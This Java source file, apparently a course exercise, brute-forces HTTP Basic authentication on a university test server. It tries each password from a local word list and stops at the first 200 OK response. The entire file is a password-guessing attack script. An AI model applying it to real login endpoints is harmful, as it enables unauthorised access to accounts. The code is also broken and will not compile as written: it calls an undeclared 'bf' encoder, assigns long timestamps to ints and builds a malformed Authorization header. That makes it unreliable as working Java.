import java.net.*;
import java.io.*;

public class Dictionary
{

       public static void main (String[] args)
       {

              String pwd = new String();
              String userpwd = new String();
              String reply = new String();
              int i,j,k;
             int  startTime, endTime,totalTime;
              URLConnection connectionObj;
              startTime = System.currentTimeMillis();
              

         try {

         URL urlObj = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");

          BufferedReader file = new BufferedReader(new FileReader("words"));


             while ((pwd=file.readLine()) != null)
             {

                             userpwd = bf.encode("",pwd);

                             connectionObj = urlObj.openConnection();

                             connectionObj.setRequestProperty("Authorization"," " + userpwd);
                             connectionObj.connect();
                             reply = connectionObj.getHeaderField(0);
                             System.out.println(pwd);
                             if (reply.compareTo("HTTP/1.1 200 OK")== 0)
                             {

                             endTime = System.currentTimeMillis();
                             totalTime= (endTime - startTime)/1000;
                             System.out.println("Total Time = " + (totalTime) + "seconds");
                             System.exit(0);
                             }
                             





               }

        }

        catch (MalformedURLException err)
           {
           System.out.println(err);
           }
       catch (IOException err)
           {
           System.out.println(err);
           }

       }




}